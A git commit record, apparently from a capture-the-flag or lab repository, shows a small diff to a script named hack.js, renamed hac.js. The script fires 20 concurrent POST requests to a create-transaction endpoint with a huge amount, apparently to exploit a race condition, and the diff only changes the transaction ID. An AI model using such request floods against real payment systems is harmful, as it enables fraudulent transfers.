bb22358682d792fcf821a04d0eab165fcd179501
Achuth V P <65720815+retrymp3@users.noreply.github.com>
2025-05-20 00:06:22 +0530

    Update and rename hack.js to hac.js

--- hac.js
+++ hac.js
@@ -8,7 +8,7 @@
     for (let i = 0; i < 20; i++) {
       fetch('/?action=create-transaction', {
         method: 'POST',
-        body: 'recipient=birdbirdbird&amount=999999999999&transaction_id=1',
+        body: 'recipient=birdbirdbird&amount=999999999999&transaction_id=2',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
       });
     }
